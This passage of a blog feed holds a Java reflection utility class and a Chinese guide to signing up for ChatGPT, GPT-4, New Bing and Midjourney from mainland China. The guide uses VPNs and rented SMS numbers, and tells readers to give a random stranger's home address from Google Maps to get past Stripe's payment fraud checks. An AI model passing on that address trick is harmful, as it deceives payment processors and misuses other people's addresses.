class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">setStringEmptyValue</span><span class="params">(Object o, Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取类中的所有定义字段</span></span><br><span class="line">        Field[] fields = FPAReflectUtils.getAllFields(c);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 循环遍历字段，获取字段对应的属性值</span></span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                <span class="comment">// 如果不为空，设置可见性，然后返回</span></span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="comment">// 属性描述器</span></span><br><span class="line">                PropertyDescriptor pd = <span class="keyword">new</span> PropertyDescriptor(field.getName(), c);</span><br><span class="line">                <span class="comment">// 获取get方法</span></span><br><span class="line">                Method getMethod = pd.getReadMethod();</span><br><span class="line">                <span class="comment">// 获取set方法</span></span><br><span class="line">                Method setMethod = pd.getWriteMethod();</span><br><span class="line">                Type type = getMethod.getGenericReturnType();</span><br><span class="line">                <span class="comment">// 通过get方法获取到值</span></span><br><span class="line">                Object value = getMethod.invoke(o);</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="keyword">null</span> &amp;&amp; type.getTypeName().equals(<span class="string">"java.lang.String"</span>)) &#123;</span><br><span class="line">                    setMethod.invoke(o, StringUtils.EMPTY);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException | IntrospectionException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取本类及其父类的属性的方法,仅一个父类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz 当前类对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 字段数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field[] getAllFields(Class&lt;?&gt; clazz) &#123;</span><br><span class="line">        List&lt;Field&gt; fieldList = <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="keyword">new</span> ArrayList&lt;&gt;(Arrays.asList(clazz.getDeclaredFields())));</span><br><span class="line">        clazz = clazz.getSuperclass();</span><br><span class="line">        fieldList.addAll(<span class="keyword">new</span> ArrayList&lt;&gt;(Arrays.asList(clazz.getDeclaredFields())));</span><br><span class="line">        Field[] fields = <span class="keyword">new</span> Field[fieldList.size()];</span><br><span class="line">        <span class="keyword">return</span> fieldList.toArray(fields);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getValueByName</span><span class="params">(Object object, Class&lt;?&gt; clazz, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IntrospectionException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"ID"</span>.equalsIgnoreCase(fieldName)) &#123;</span><br><span class="line">            PropertyDescriptor pd = <span class="keyword">new</span> PropertyDescriptor(<span class="string">"id"</span>, clazz);</span><br><span class="line">            <span class="comment">// 获取get方法</span></span><br><span class="line">            Method getMethod = pd.getReadMethod();</span><br><span class="line">            <span class="comment">// 通过get方法获取到值</span></span><br><span class="line">            <span class="keyword">return</span> getMethod.invoke(object);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (field.getName().equals(fieldName)) &#123;</span><br><span class="line">                    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    PropertyDescriptor pd = <span class="keyword">new</span> PropertyDescriptor(field.getName(), clazz);</span><br><span class="line">                    <span class="comment">// 获取get方法</span></span><br><span class="line">                    Method getMethod = pd.getReadMethod();</span><br><span class="line">                    <span class="comment">// 通过get方法获取到值</span></span><br><span class="line">                    <span class="keyword">return</span> getMethod.invoke(object);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException(fieldName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title">getAnnotationFields</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Class&lt;?&gt; clazz = o.getClass();</span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> annotationPresent = field.isAnnotationPresent(TableField<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="keyword">if</span> (annotationPresent) &#123;</span><br><span class="line">                String name = field.getAnnotation(TableField<span class="class">.<span class="keyword">class</span>).<span class="title">value</span>()</span>;</span><br><span class="line">                map.put(field.getName(), name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过表名获取字段名，ID特殊处理</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tableName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> Kaciry</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getFieldNameByTableName</span><span class="params">(Class&lt;?&gt; clazz, String tableName)</span> <span class="keyword">throws</span> NoSuchFieldException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"ID"</span>.equalsIgnoreCase(tableName)) <span class="keyword">return</span> <span class="string">"ID"</span>;</span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> annotationPresent = field.isAnnotationPresent(TableField<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="keyword">if</span> (annotationPresent) &#123;</span><br><span class="line">                String fieldName = field.getAnnotation(TableField.class).value().replace("`", "");</span><br><span class="line">                <span class="keyword">if</span> (fieldName.equals(tableName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> field.getName();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过字段名获取表的列名</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> Kaciry</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getTableNameByFieldName</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException </span>&#123;</span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> annotationPresent = field.isAnnotationPresent(TableField<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="keyword">if</span> (annotationPresent &amp;&amp; field.getName().equals(fieldName)) &#123;</span><br><span class="line">                return field.getAnnotation(TableField.class).value().replace("`", "");</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * map转object</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Object</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">mapToObj</span><span class="params">(Map map, Class&lt;T&gt; target)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field[] fields = target.getDeclaredFields();</span><br><span class="line">        T o = target.newInstance();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            Object val;</span><br><span class="line">            <span class="keyword">if</span> ((val = map.get(field.getName())) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                field.set(o, val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 目标实例化对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> source       原对实例化象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> target       目标对象类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sourceFields 源对象字段集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetFields 目标对象属性字段集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 目标实例化对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">newInstance</span><span class="params">(Object source, Class&lt;T&gt; target, List&lt;Field&gt; sourceFields,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     List&lt;Field&gt; targetFields)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        T t = target.newInstance();</span><br><span class="line">        <span class="keyword">if</span> (targetFields.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Field field : sourceFields) &#123;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object o = field.get(source);</span><br><span class="line">            Field sameField = getSameField(field, targetFields);</span><br><span class="line">            <span class="keyword">if</span> (Objects.nonNull(sameField)) &#123;</span><br><span class="line">                sameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                sameField.set(t, o);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取目标对象中同源对象属性相同的属性（字段名称，字段类型一致则判定为相同）</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> field  源对象属性</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fields 目标对象属性集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 目标对象相同的属性</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title">getSameField</span><span class="params">(Field field, List&lt;Field&gt; fields)</span> </span>&#123;</span><br><span class="line">        String name = field.getName();</span><br><span class="line">        String type = field.getType().getName();</span><br><span class="line">        <span class="keyword">for</span> (Field f : fields) &#123;</span><br><span class="line">            <span class="keyword">if</span> (name.equals(f.getName()) &amp;&amp; type.equals(f.getType().getName())) &#123;</span><br><span class="line">                <span class="keyword">return</span> f;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取一个类中的所有属性（包括父类属性）</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> c 类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> List&lt;Field&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;Field&gt; <span class="title">getFields</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        List&lt;Field&gt; fieldList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Field[] fields = c.getDeclaredFields();</span><br><span class="line">        <span class="keyword">if</span> (fields.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            fieldList.addAll(Arrays.asList(fields));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getSuperClassFields(c, fieldList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 递归获取父类属性</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> o         类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> allFields 外层定义的所有属性集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 父类所有属性</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;Field&gt; <span class="title">getSuperClassFields</span><span class="params">(Class&lt;?&gt; o, List&lt;Field&gt; allFields)</span> </span>&#123;</span><br><span class="line">        Class&lt;?&gt; superclass = o.getSuperclass();</span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(superclass) || Object<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>().<span class="title">equals</span>(<span class="title">superclass</span>.<span class="title">getName</span>())) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> allFields;</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] fields = superclass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">if</span> (fields.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> allFields;</span><br><span class="line">        &#125;</span><br><span class="line">        allFields.addAll(Arrays.asList(fields));</span><br><span class="line">        <span class="keyword">return</span> getSuperClassFields(superclass, allFields);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> reflection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目前常见AI软件国区注册与使用</title>
      <link href="/2023/02/11/%E7%9B%AE%E5%89%8D%E5%B8%B8%E8%A7%81AI%E8%BD%AF%E4%BB%B6%E5%9B%BD%E5%8C%BA%E6%B3%A8%E5%86%8C%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/02/11/%E7%9B%AE%E5%89%8D%E5%B8%B8%E8%A7%81AI%E8%BD%AF%E4%BB%B6%E5%9B%BD%E5%8C%BA%E6%B3%A8%E5%86%8C%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="国区注册OpenAI账号使用ChatGPT指南"><a href="#国区注册OpenAI账号使用ChatGPT指南" class="headerlink" title="国区注册OpenAI账号使用ChatGPT指南"></a>国区注册OpenAI账号使用ChatGPT指南</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li>科学上网，最好是美国IP</li><li>外国邮箱，如gmail、outlook、iCloud邮箱等</li><li>有一个能收到验证码的外国手机号码，如果你没有，请跳到下一步，注册一个能接验证码的手机号，注意这是收费的！</li></ul><h3 id="注册短信平台并充值"><a href="#注册短信平台并充值" class="headerlink" title="注册短信平台并充值"></a>注册短信平台并充值</h3><p>打开 <a href="https://sms-activate.org/" target="_blank" rel="noopener">https://sms-activate.org/ (opens new window)</a>点击右上角注册</p><p><img src="/img/ai/sms0.png" alt=""></p><p>输入邮箱和密码注册，需要收激活邮件激活账号。</p><p><img src="/img/ai/sms1.png" alt=""></p><p>激活账号后，点击充值</p><p><img src="/img/ai/sms2.png" alt=""></p><p>可以用支付宝充值1美元</p><p><img src="/img/ai/sms3.png" alt=""></p><p>输入1美元，然后支付</p><p><img src="/img/ai/sms4.png" alt=""></p><p>支付了可能要等几分钟才显示到余额账户，我在注册时就等了一会余额才显示</p><h3 id="注册OpenAI账号"><a href="#注册OpenAI账号" class="headerlink" title="注册OpenAI账号"></a>注册OpenAI账号</h3><p>挂上科学访问打开 <a href="https://beta.openai.com/signup" target="_blank" rel="noopener">https://beta.openai.com/signup (opens new window)</a>进行注册，如果没有科学上网会提示无法注册</p><blockquote><p>OpenAI’s services are not available in your country.</p></blockquote><p>注册成功后会进入验证手机号页面，<strong>选择你下一步短信平台的接码的手机国家</strong></p><p><img src="/img/ai/sms5.png" alt=""></p><h3 id="在短信平台接收验证码"><a href="#在短信平台接收验证码" class="headerlink" title="在短信平台接收验证码"></a>在短信平台接收验证码</h3><blockquote><p>右侧服务，输入搜索openai，选择</p></blockquote><p><img src="/img/ai/sms6.png" alt=""></p><p>选择印度或者巴西</p><p><img src="/img/ai/sms7.png" alt=""></p><p>现在你有一个可以接码的号码了，图下919862209703就是号码，复制号码到OpenAI验证码界面</p><p><img src="/img/ai/sms8.png" alt=""></p><p>输入接码号码，点击“send code”</p><p><img src="/img/ai/sms9.png" alt=""></p><p><img src="/img/ai/sms10.png" alt=""></p><p>然后等激活码，如果没有收到可以点OpenAI注册界面再发一次验证码，可以多试几次。</p><p>注册完就可以去登录 <a href="https://chat.openai.com/auth/login" target="_blank" rel="noopener">https://chat.openai.com/auth/login</a></p><p><img src="/img/ai/sms11.png" alt=""></p><h3 id="常见错误提示以及解决方案"><a href="#常见错误提示以及解决方案" class="headerlink" title="常见错误提示以及解决方案"></a>常见错误提示以及解决方案</h3><h4 id="1-issue-Access-denied"><a href="#1-issue-Access-denied" class="headerlink" title="1.issue: Access denied"></a>1.issue: Access denied</h4><p>无法登录登录的时候，提示Access denied,You do not have access to chat.openai.com.</p><p><img src="/img/ai/chatGPTError0.png" alt=""></p><ul><li>原因</li></ul><p>登录出现这个界面，说明你的IP被OpenAI拉黑了，OpenAI对比较频繁访问的云主机商屏蔽了相关的IP出口段，所以可能需要更换IP</p><ul><li>解决</li></ul><p>1、尝试使用无痕浏览模式访问</p><p>2、尝试更换科学上网节点(东南亚节点较好)</p><h4 id="2-issue-An-error-occurred"><a href="#2-issue-An-error-occurred" class="headerlink" title="2.issue: An error occurred"></a>2.issue: An error occurred</h4><p>每次打开，或者重新刷新页面后快速问问题都可以正常回答，只要停着不动超过 1~2 分钟以后，再提问就会提示：</p><blockquote><p>An error occurred. If this issue persists please contact us through our help center at help.openai.com.</p></blockquote><ul><li>原因</li></ul><p>网站使用了Cloudflare防护，如果较为频繁切换IP或频繁访问就会触发防护</p><ul><li>解决</li></ul><p>1、清除浏览器cookie或用无痕模式重新登录</p><p>2、开通plus，可无限制访问</p><h4 id="3-issue-cloudflare死循环验证"><a href="#3-issue-cloudflare死循环验证" class="headerlink" title="3.issue: cloudflare死循环验证"></a>3.issue: cloudflare死循环验证</h4><p>访问的时候弹出cloudflare验证，点击验证后，转一会又提示验证，无限循环</p><p><img src="/img/ai/chatGPTError1.png" alt=""></p><ul><li>原因</li></ul><p>出口IP问题，可能有其他bot流量使用了这个IP，导致cf不断触发验证</p><ul><li>解决</li></ul><p>1、无痕模式重新登录</p><p>2、尝试更换科学上网节点</p><h2 id="GPT-4开通使用教程"><a href="#GPT-4开通使用教程" class="headerlink" title="GPT-4开通使用教程"></a>GPT-4开通使用教程</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>1、一个ChatGPT账号</p><p>开通方法见上文</p><p>2、信用卡</p><p>支持双币支付的信用卡，最好是外国的虚拟卡</p><p>3、生成支付一个地址</p><p>付款的时候，stripe风控会验证你当前登录的IP和地址的关系，最好方式是根据当前的IP所在的城市，在谷歌地图上找一个地址：</p><p>1）先查询当前ip城市，参考这两个网站</p><p><a href="https://whatismyipaddress.com/" target="_blank" rel="noopener">https://whatismyipaddress.com/(opens new window)</a></p><p><a href="https://www.strerr.com/ip.html" target="_blank" rel="noopener">IP查询_专业的 IP 地址库 - StrErr.com(opens new window)</a></p><p>获取到当前城市</p><p><img src="/img/ai/chatGPT4-register0.png" alt=""></p><p>2）在谷歌地图上搜索该城市的一个民宅</p><p><img src="/img/ai/chatGPT4-register1.png" alt=""></p><p>3）点击民宅，会出现地址和邮编</p><p><img src="/img/ai/chatGPT4-register2.png" alt=""></p><p>记下这个地址和邮编，在付款时使用</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="1、点击Upgrade-to-Plus"><a href="#1、点击Upgrade-to-Plus" class="headerlink" title="1、点击Upgrade to Plus"></a>1、点击Upgrade to Plus</h4><p><img src="/img/ai/chatGPT4-register3.png" alt=""></p><h4 id="2、点击Upgrate-plan"><a href="#2、点击Upgrate-plan" class="headerlink" title="2、点击Upgrate plan"></a>2、点击Upgrate plan</h4><p><img src="/img/ai/chatGPT4-register4.png" alt=""></p><h4 id="3、填写支付信息"><a href="#3、填写支付信息" class="headerlink" title="3、填写支付信息"></a>3、填写支付信息</h4><p>地址用刚才谷歌地图获取到的</p><p><img src="/img/ai/chatGPT4-register5.png" alt=""></p><p>有一定几率会出现支付失败，出现这种情况可以多试几次。</p><p><img src="/img/ai/chatGPT4-register6.png" alt=""></p><h4 id="4、选择GPT-4模型"><a href="#4、选择GPT-4模型" class="headerlink" title="4、选择GPT-4模型"></a>4、选择GPT-4模型</h4><p><img src="/img/ai/chatGPT4-register7.png" alt=""></p><p>开通成功后会显示PLUS用户</p><p><img src="/img/ai/chatGPT4-register8.png" alt=""></p><h3 id="GPT-4有什么新功能"><a href="#GPT-4有什么新功能" class="headerlink" title="GPT-4有什么新功能"></a>GPT-4有什么新功能</h3><p><img src="/img/ai/chatGPT4-register9.png" alt=""></p><p>下一代 OpenAI 的语言模型在原创性、视觉输入和更长的上下文三个方面优于以前的版本。根据 OpenAI 的说法，GPT-4 更有能力在创意项目上进行原创创作和有效的用户协作。</p><p>多种形式的创意写作，如音乐、电影剧本、技术手册，甚至“了解用户的写作风格”，都属于这一类。</p><p>然而，这些是 GPT-4 最大的新特性简要介绍：</p><ul><li>处理文字能力是 ChatGPT 的 8 倍</li><li>支持视觉输入</li></ul><h4 id="GPT-4-性能基准"><a href="#GPT-4-性能基准" class="headerlink" title="GPT-4 性能基准"></a>GPT-4 性能基准</h4><p>OpenAI 通过模拟为人类设计的考试来评估 GPT-4，例如律师的统一律师考试和 LSAT，以及大学录取的 SAT。</p><p>结果表明，GPT-4 在各种专业和学术基准上取得了人类水平的表现。</p><p><img src="/img/ai/chatGPT4-register10.png" alt=""></p><h4 id="GPT-4-的视觉输入"><a href="#GPT-4-的视觉输入" class="headerlink" title="GPT-4 的视觉输入"></a>GPT-4 的视觉输入</h4><p>一个主要变化是 GPT-4 可以使用图像输入和文本。用户可以通过输入穿插的文本和图像来指定任何视觉或语言任务。</p><p>在 GPT-4 Developer Livestream 期间，OpenAI 展示了该平台能够将一个潦草的网站原型图转换成一个功能齐全的网站，该网站不仅可以运行，还可以生成更多内容来填充该网站。</p><p><a href="https://twitter.com/i/status/1635827979946446848" target="_blank" rel="noopener">GPT-4从网站原型图生成一个网站</a></p><p><img src="/img/ai/chatGPT4-register11.png" alt=""></p><h2 id="微软New-Bing注册指南"><a href="#微软New-Bing注册指南" class="headerlink" title="微软New Bing注册指南"></a>微软New Bing注册指南</h2><h3 id="前期准备-1"><a href="#前期准备-1" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li>可全局的科学上网（最好是vpn）</li><li>微软账号，注册地址：<a href="https://account.microsoft.com/account?lang=zh-cn" target="_blank" rel="noopener">微软账号注册(opens new window)</a></li><li>打开Edge浏览器，New Bing目前只支持Edge浏览器</li></ul><h3 id="修改微软账号地区"><a href="#修改微软账号地区" class="headerlink" title="修改微软账号地区"></a>修改微软账号地区</h3><p>由于国区申请New Bing人较多，大概率会进入等候名单，所以尝试将地址修改到其他地区。</p><p>小编通过修改地区到日本马上就能用了，没有进入等候名单。步骤：</p><p>登录微软账号</p><p><a href="https://account.microsoft.com/account?lang=zh-cn" target="_blank" rel="noopener">https://account.microsoft.com/account?lang=zh-cn</a></p><p><img src="/img/ai/NewBing0.png" alt=""></p><p>修改账号地区</p><p><img src="/img/ai/NewBing1.png" alt=""></p><h3 id="申请New-Bing"><a href="#申请New-Bing" class="headerlink" title="申请New Bing"></a>申请New Bing</h3><p>先开启全局科学上网，如果没有全局就会跳到中国区bing搜索。</p><p>打开New Bing地址</p><p><a href="https://www.bing.com/new" target="_blank" rel="noopener">https://www.bing.com/new(opens new window)</a></p><p>选择开始聊天</p><p><img src="/img/ai/NewBing2.png" alt=""></p><p>如果没有进入等待队列，会进入对话页面</p><p><img src="/img/ai/NewBing3.png" alt=""></p><p>如果对生成答案不满意，还可调整生成方式</p><p><img src="/img/ai/NewBing4.png" alt=""></p><h2 id="AI绘画Midjourney注册使用教程"><a href="#AI绘画Midjourney注册使用教程" class="headerlink" title="AI绘画Midjourney注册使用教程"></a>AI绘画Midjourney注册使用教程</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着ChatGPT席卷全球，生成式AI越来越受关注，其中AI图像生成涌现很多工具。</p><p>Midjourney 是一款强大的 AI 图像生成工具，只需要简单的自然语言描述就能快速生成图像。</p><p>与其他AI图像生成相比，Midjourney学习成本更低，生成速度更快，风格更多样化，是现在接触AI绘画最好的方式之一了。</p><h3 id="前期准备-2"><a href="#前期准备-2" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li>科学上网，Midjourney目前托管在discord作为插件使用，discord目前被墙</li><li>淘宝，Midjourney的免费计划在3月28号已经取消，目前只有开通订阅才能使用，淘宝有共享账号或代充，以下介绍的是自己注册+淘宝代充</li></ul><h3 id="注册Midjourney"><a href="#注册Midjourney" class="headerlink" title="注册Midjourney"></a>注册Midjourney</h3><p>打开官网<a href="https://www.midjourney.com/" target="_blank" 